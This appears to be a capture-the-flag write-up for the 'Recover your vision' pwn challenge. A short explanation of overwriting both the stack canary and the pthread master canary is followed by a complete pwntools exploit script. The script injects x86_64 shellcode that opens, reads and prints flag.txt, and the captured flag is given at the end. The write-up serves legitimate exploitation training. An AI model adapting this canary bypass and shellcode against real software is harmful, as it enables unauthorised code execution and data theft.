# Recover your vision

## Solution

Because the program use pthread, master canary is on the stack.

Use stack buffer overflow to overwrite canary and master canary together.

We get buffer's address initially. Write shellcode at the buffer and jump to that address.

We can use open, read, and write system call, so read and print out `flag.txt`.

```python
import pwn
# p = pwn.process(['./ld-linux-x86-64.so.2','./blind'],env={"LD_PRELOAD": "./libc.so.6"})
HOST="e9c7bd64c6c4e71aba4b13253eaf67ae.chal.ctf.ae"
p = pwn.remote(HOST, 443, ssl=True, sni=HOST)
# pwn.gdb.attach(p, 'break *0x40140b\n')

p.recvuntil(b'Buffer: ')
buf_addr = int(p.recvline().strip().decode(),16)

p.recvuntil(b'shellcode: ')
p.sendline(b'10000')

p.recvuntil(b'Escape> ')


# flag.txt : 66 6c 61 67 2e 74 78 74 00
shellcode = '''
xor rax, rax
push rax
mov rbx, 0x7478742e67616c66 
push rbx
push rsp
pop rdi
xor rsi, rsi
xor rdx, rdx
mov rax, 2
syscall

mov rdi, rax
mov rsi, rsp
mov rdx, 100
mov rax, 0
syscall

mov rdi, 2
mov rsi, rsp
mov rdx, 100
mov rax, 1
syscall

mov rax, 60
syscall
'''

# master canary - stack canary = 0x820


new_canary = b'\0\0\0\0\0\0\0\0'
pwn.context.arch = 'x86_64'
shellcode_bin = pwn.asm(shellcode)
print(len(shellcode_bin))
print(pwn.hexdump(shellcode_bin))
fs_base = buf_addr + 0x880
payload = shellcode_bin.ljust(0x78, b'\0') + new_canary + b'B'*8 + pwn.p64(buf_addr) + b'A'*(0x7f0) + \
    pwn.p64(fs_base)+pwn.p64(fs_base+0xa20)+pwn.p64(fs_base)+pwn.p64(1)+pwn.p64(0)+ new_canary # fs:28

print(len(payload))
p.send(payload)

p.interactive()
```

flag is : **flag{RiQM18hm4nihV3j0HUnblB9AmIRZwhh4}**